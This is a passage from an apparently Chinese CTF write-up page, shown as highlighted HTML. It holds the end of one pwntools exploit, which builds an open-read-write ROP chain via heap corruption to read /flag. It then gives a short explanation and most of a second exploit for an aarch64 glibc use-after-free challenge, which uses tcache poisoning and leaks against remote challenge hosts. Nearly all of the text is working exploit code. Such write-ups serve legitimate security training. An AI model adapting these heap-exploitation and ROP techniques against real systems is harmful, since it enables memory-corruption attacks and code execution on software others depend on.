+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>key</span> <span class=o>^</span> <span class=p>(</span><span class=n>heap_base</span> <span class=o>+</span> <span class=mh>0x2a0</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x200</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>environ</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;environ&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x41</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>environ</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Content: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>stack</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;stack&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>t1</span> <span class=o>=</span> <span class=n>stack</span> <span class=o>-</span> <span class=mh>0x2b0</span>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x41</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>t1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#gdb.attach(io,gdbscript)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc_rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>libc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rax</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rax&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>rdi</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rdi&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>rsi</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;pop rsi&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=n>rdx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x00000000000a85a9</span> <span class=c1># pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span>
+</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=mi>3</span>
+</span></span><span class=line><span class=cl><span class=c1>#rdx = libc_rop.find_gadget([&#39;pop rdx&#39;,&#39;pop rbx&#39;,&#39;ret&#39;])[0]; m = 2</span>
+</span></span><span class=line><span class=cl><span class=n>syscall</span> <span class=o>=</span> <span class=n>libc_rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>&#39;syscall&#39;</span><span class=p>,</span><span class=s1>&#39;ret&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>orw_rop_addr</span> <span class=o>=</span> <span class=n>t1</span> <span class=c1># ret to addr</span>
+</span></span><span class=line><span class=cl><span class=n>buf</span> <span class=o>=</span> <span class=n>orw_rop_addr</span> <span class=o>+</span> <span class=mh>0xa0</span> <span class=o>+</span> <span class=n>m</span><span class=o>*</span><span class=mi>3</span><span class=o>*</span><span class=mi>8</span>
+</span></span><span class=line><span class=cl><span class=n>orw_rop</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x10000000000000000</span><span class=o>-</span><span class=mi>100</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=n>m</span>       <span class=o>+</span>     <span class=n>p64</span><span class=p>(</span><span class=n>rax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>257</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>*</span><span class=n>m</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>orw_rop</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span><span class=o>*</span><span class=n>m</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>orw_rop</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;/flag&#39;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>orw_rop</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#ru(&#39;select: &#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#sl(&#39;1&#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#ru(&#39;rs): &#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#sl(pwd)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#edit(0,0xFFF00000078,&#39;hack&#39;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1>#ru(b&#39;select: &#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#sl(&#39;1&#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#ru(b&#39;Please enter old password for verification: &#39;)</span>
+</span></span><span class=line><span class=cl><span class=c1>#sl(pwd)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#add(0x10FFFFFF8)</span>
+</span></span><span class=line><span class=cl><span class=c1>#edit(4,0x2FFFFFFFF,&#39;hah&#39;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#rm(0)</span>
+</span></span><span class=line><span class=cl><span class=c1>#add(0x7fffffff)</span>
+</span></span><span class=line><span class=cl><span class=c1>#edit(0,0xffffffff,y=0)</span>
+</span></span><span class=line><span class=cl><span class=c1>#rm(1)</span>
+</span></span><span class=line><span class=cl><span class=c1>#dit(1,0x58,b&#39;B&#39;*0x58)</span>
+</span></span><span class=line><span class=cl><span class=c1>#pay = flat({</span>
+</span></span><span class=line><span class=cl><span class=c1>#},filler=b&#39;\x00&#39;)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># libc.address = libc_base</span>
+</span></span><span class=line><span class=cl><span class=c1># system = libc.sym[&#39;system&#39;]</span>
+</span></span><span class=line><span class=cl><span class=c1># bin_sh = next(libc.search(b&#39;/bin/sh&#39;))</span>
+</span></span><span class=line><span class=cl><span class=n>itr</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=aaaheap>aaaheap</h2><p>ARM aarch64 架构下的一个 glibc 堆体题目，UAF 漏洞， heap list 也在 heap 上,UAF 构造任意地址申请到heaplist后既可以任意地址读写，后面把 shellcode写到 heap上 然后修改 stack 上的返回地址， ret2shellcode</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
+</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
+</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>ls</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\033</span><span class=s1>[1;31;40m</span><span class=si>%s</span><span class=s1> -&gt; 0x</span><span class=si>%x</span><span class=s1> </span><span class=se>\033</span><span class=s1>[0m&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=nb>eval</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>attack</span> <span class=o>=</span> <span class=s1>&#39;1.1.11 123&#39;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;./vuln&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=o>=</span> <span class=s1>&#39;qemu-aarch64-static -L ./lib/ ./vuln&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#cmd = &#39;qemu-aarch64-static -g 1234 -L ./lib/ ./vuln&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>binary</span><span class=o>=</span><span class=n>binary</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>cmd</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=c1>#io = remote(&#34;pwn-e45167b3ab.challenge.xctf.org.cn&#34;, 9999, ssl=True)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;pwn-7ad75533cf.challenge.xctf.org.cn&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>,</span> <span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>size</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index : &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Size: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;data: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>n</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Choice: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Data: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>heap_base</span> <span class=o>=</span> <span class=n>key</span> <span class=o>&lt;&lt;</span> <span class=mh>0xC</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;heap_base&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./lib/lib/libc.so.6&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>rm</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>((</span><span class=n>heap_base</span><span class=o>-</span><span class=mh>0x90</span><span class=p>)</span> <span class=o>^</span> <span class=n>key</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=mh>0x78</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>-</span><span class=mh>0xF0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>pay</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;Data: &#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>elf_base</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x2688</span>
+</span></span><span class=line><span class=cl><span class=n>lss</span><span class=p>(</span><span class=s1>&#39;elf_base&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>t2</span> <span class=o>=</span> <span class=n>elf_base</span> <span class=o>+</span> <span class=mh>0x15F28</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>t2</span><span class=p>)</span>
